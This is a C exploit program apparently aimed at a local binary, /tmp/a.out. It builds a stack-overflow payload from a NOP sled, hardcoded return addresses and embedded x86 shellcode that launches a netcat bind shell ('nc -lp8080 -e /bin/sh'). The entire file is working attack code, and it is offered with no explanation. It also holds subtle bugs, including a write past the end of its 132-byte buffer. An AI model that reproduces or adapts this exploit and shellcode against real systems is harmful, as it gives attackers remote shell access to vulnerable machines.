#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define NOP 0x90

char *convert(char *, unsigned int );

const char *path = "/tmp/a.out";
const char *name = "a.out";


int main(int argc, char *argv[])
{
    char payload[132];
    char eip[5];
    char saved[5];
    char ret_addr[5];
    char *shellcode = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";

    unsigned int owned = 0x0804847e;
    unsigned int sfp = 0xdeadbeef;
    unsigned int ret = 0xffffd40c;

    convert(eip, owned);
    convert(saved, sfp);
    convert(ret_addr, ret);

    memset(payload, NOP, 53);
    memcpy(payload+53, shellcode, strlen(shellcode));
    memcpy(payload+128, saved, sizeof(sfp));
    memcpy(payload+132, ret_addr, sizeof(ret_addr));

    if(!execl(path, name, payload, 0))
    {
    	fprintf(stderr, "[!] Something went wrong...\n");
    	exit(0);
    }
    return 0;   
}


char *convert(char *output, unsigned int address)
{
    snprintf(output, 5, "%c%c%c%c", (char)address&0x000000FF, (char)(address >> 8)&0x000000FF, (char)(address >> 16)&0x000000FF, (char)(address >> 24)&0x000000FF);
    return 0;
}
